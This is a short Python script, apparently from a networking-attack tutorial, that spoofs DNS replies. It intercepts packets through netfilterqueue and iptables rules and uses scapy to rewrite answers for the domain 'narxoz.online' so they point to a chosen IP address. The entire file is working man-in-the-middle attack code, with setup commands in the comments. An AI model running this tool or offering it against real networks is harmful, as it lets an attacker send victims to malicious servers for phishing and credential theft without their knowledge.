import netfilterqueue
import scapy.all


#apt-get install python-netfilterqueue
#pip install Cython --install-option="--no-cython-compile"
#apt-get install build-essential python-dev libnetfilter-queue-dev
#iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables --flush

target_website = "narxoz.online"
server_ip = "10.0.2.5"

def process_packet(packet):
    scapy_packet = scapy.all.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.all.DNSRR):
        qname = scapy_packet[scapy.all.DNSQR].qname
        if target_website in qname.decode('cp866'):
            print("[+] Spoofing target")
            answer = scapy.all.DNSRR(rrname = qname, rdata = server_ip)
            scapy_packet[scapy.all.DNS].an = answer
            #Change it if it is defferent than yout number of answers
            scapy_packet[scapy.all.DNS].ancount = 1

            #delet len and chksum in order to prevent errors. Scapy will automatically recalculate them
            del scapy_packet[scapy.all.IP].len
            del scapy_packet[scapy.all.IP].chksum
            del scapy_packet[scapy.all.UDP].len
            del scapy_packet[scapy.all.UDP].chksum

            # packet.set_payload(str(scapy_packet).encode("utf-8"))
            packet.set_payload(bytes(scapy_packet))

        #print(scapy_packet.show())
    packet.accept()
    #packet.drop()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()